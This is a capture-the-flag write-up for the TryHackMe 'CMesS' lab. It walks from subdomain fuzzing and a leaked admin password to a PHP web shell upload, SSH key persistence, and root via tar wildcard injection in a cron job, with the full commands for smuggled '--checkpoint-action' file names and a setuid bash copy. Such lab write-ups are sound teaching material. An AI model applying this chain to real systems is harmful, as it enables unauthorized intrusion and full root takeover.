# CMesS (THM)

- https://tryhackme.com/room/cmess
- Feb 27, 2023
- medium

---

## Intital Recon

- nmap result

1. 22/tcp - OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
2. 80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))
   - http-generator: Gila CMS
   - http-robots.txt: 3 disallowed entries
     - /src/ /themes/ /lib/
   - http-server-header: Apache/2.4.18 (Ubuntu)
   - http-title: Site doesn't have a title (text/html; charset=UTF-8).
   - Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- subdomain brute force
- add `cmess.thm` in /etc/hosts

```sh
ffuf -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -fw 522
```

- found `dev`
- `dev.cmess.thm` ->

```
Development Log
...
andre@cmess.thm
That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.

support@cmess.thm
Your password has been reset. Here: KPFTN_f2yxe%
```

## User Access

- login at `cmess.thm/admin`
- at admin panel
- Content -> File Manager -> upload php shell
- then listen with nc, and curl the `cmess.thm/assets/shell.php`

```
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *

```

```
╔══════════╣ Executable files potentially added by user (limit 70)
2020-02-06+18:54:07.1196134090 /opt/.password.bak
```

```sh
www-data@cmess:/$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6

www-data@cmess:/$ su andre
Password: UQfsdCB7aAP6

andre@cmess:/$

```

- to get ssh shell

  - inside local machine
    - create id_rsa, and id_rsa.pub
    - copy the content of id_rsa.pub
  - in remote shell,
    - create .ssh folder under andre home directory
    - paste the content of id_rsa.pub as authorized_keys

- enter ssh as andre user with id_rsa

## Root Access

- cron job that will run by root

```
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

- cd into backup folder

```sh
andre@cmess:~/backup$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
andre@cmess:~/backup$ chmod +x runme.sh
andre@cmess:~/backup$ ls
note  runme.sh
andre@cmess:~/backup$ touch "/home/andre/backup/--checkpoint=1"
andre@cmess:~/backup$ touch "/home/andre/backup/--checkpoint-action=exec=sh runme.sh"

```

- wait for root to run the cron job
- after running, bash will appear in tmp folder

```sh
/tmp/bash -p
```

- will get root access

---
